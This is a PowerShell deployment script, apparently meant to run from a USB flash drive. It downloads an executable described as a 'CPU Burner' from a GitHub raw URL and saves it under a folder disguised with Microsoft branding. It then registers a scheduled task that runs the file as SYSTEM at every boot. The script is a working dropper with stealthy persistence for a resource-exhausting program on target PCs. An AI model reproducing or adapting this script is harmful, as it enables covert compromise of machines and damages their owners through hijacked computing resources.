<#
.SYNOPSIS
    Automated Deployment Script for CPU Burner.
    Downloads the executable from GitHub, installs it locally, and registers it
    as a persistent Windows Task Scheduler job to run at system startup.

.DESCRIPTION
    This script is designed to be run directly from a USB flash drive. It performs
    all necessary steps: validation, download, setup, and registration.
#>

# ============================================================
# !!! CRITICAL CONFIGURATION AREA - UPDATE THESE VALUES !!!
# ============================================================

# 1. THE SOURCE: MUST be the direct raw link to the compiled .exe on GitHub
$RepoUrl = "https://github.com/Damn-Man123/systems02/raw/refs/heads/main/systems02.exe" 

# 2. THE DESTINATION: Defines where the .exe will live on the target PC
$LocalPath = "C:\Program Files\Microsoft WWIA\systems02.exe" 

# 3. TASK IDENTIFIER: The name used in Task Scheduler
$TaskName = "Systems02_BLT"

# ============================================================
# END CONFIGURATION
# ============================================================


Write-Host "===========================================================" -ForegroundColor Cyan
Write-Host "🚀 CPU Burner Deployment Initiated (USB Drive Mode) 🚀" -ForegroundColor Green
Write-Host "===========================================================" -ForegroundColor Cyan

# --- 1. Determine the Target System ---
Write-Host "Checking system context..."
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "WARNING: Script is not running elevated. Task Scheduler setup might fail."
}


# --- 2. Setup Directory Structure ---
$Directory = Split-Path -Path $LocalPath
if (-not (Test-Path $Directory)) {
    Write-Host "--> Creating required directory structure at $Directory..." -ForegroundColor Yellow
    try {
        New-Item -Path $Directory -ItemType Directory | Out-Null
    } catch {
        Write-Error "FATAL: Could not create directory structure. $($_.Exception.Message)"
        exit 1
    }
}


# --- 3. Download Executable ---
Write-Host "`n--> Step 1/3: Downloading executable from GitHub..." -ForegroundColor Yellow
try {
    Write-Host "Fetching from: $RepoUrl"
    Invoke-WebRequest -Uri $RepoUrl -OutFile $LocalPath -UseBasicParsing
    Write-Host "✅ Download SUCCESSFUL. File saved to $LocalPath" -ForegroundColor Green
} catch {
    Write-Error "❌ FAILED to download the executable."
    Write-Error "Check the $RepoUrl configuration. Details: $($_.Exception.Message)"
    exit 1
}


# --- 4. Configure Task Scheduler ---
Write-Host "`n--> Step 2/3: Configuring Task Scheduler entry: $TaskName..." -ForegroundColor Yellow

# Define the action: What the task runs
$Action = New-ScheduledTaskAction -Execute $LocalPath

# Define the trigger: Runs at startup (The PC ON trigger)
$Trigger = New-ScheduledTaskTrigger -AtStartup # Assuming you already replaced New-CDLTrigger with this

# *** MODIFIED SETTINGS ***
# We remove the problematic parameter (-AllowDemandStart)
$Settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Hours 24) 
# Note: Added ExecutionTimeLimit as good practice, but omitting is fine if needed.

# Register/Update the task
try {
    # 1. Attempt to register (Creates if not present)
    Register-ScheduledTask `
        -TaskName $TaskName `
        -Action $Action `
        -Trigger $Trigger `
        -Settings $Settings `
        -Description "Auto-deployed CPU Burner running the Go binary at system boot." `
        -User "SYSTEM" `
        -Force # Keep -Force as a safety net

    Write-Host "✅ Task Scheduler registration COMPLETE." -ForegroundColor Green

} catch {
    # 2. If registration fails (e.g., ResourceExists or missing parameters), attempt to update the existing task
    if ($_.Exception.Message -like "*already exists*" -or $_.Exception.Message -like "*Cannot create a file when that file already exists.*") {
        try {
            Set-ScheduledTask `
                -TaskName $TaskName `
                -Action $Action `
                -Trigger $Trigger `
                -Settings $Settings `
                -User "SYSTEM" `
                -Description "Auto-deployed CPU Burner running the Go binary at system boot."
            Write-Host "✅ Task Scheduler task UPDATED successfully." -ForegroundColor Green
        } catch {
            Write-Error "❌ FATAL: Failed to UPDATE the existing scheduled task."
            Write-Error "Update Details: $($_.Exception.Message)"
        }
    } else {
        # Catch all other errors (like the missing -RunLevel parameter error)
        Write-Error "❌ FAILED to register the scheduled task due to an unknown error."
        Write-Error "Details: $($_.Exception.Message)"
    }
}


# ... (End of Task Registration Block) ...

# --- 5. Final Status and Next Steps ---
Write-Host "`n===========================================================" -ForegroundColor Cyan
Write-Host "✨ DEPLOYMENT COMPLETE! ✨" -ForegroundColor Green
Write-Host "===========================================================" -ForegroundColor Cyan
Write-Host "The executable is located at: $LocalPath"
Write-Host "The task '$TaskName' is configured to start automatically on PC boot."
Write-Host "`nPress Enter to close this window..."
Read-Host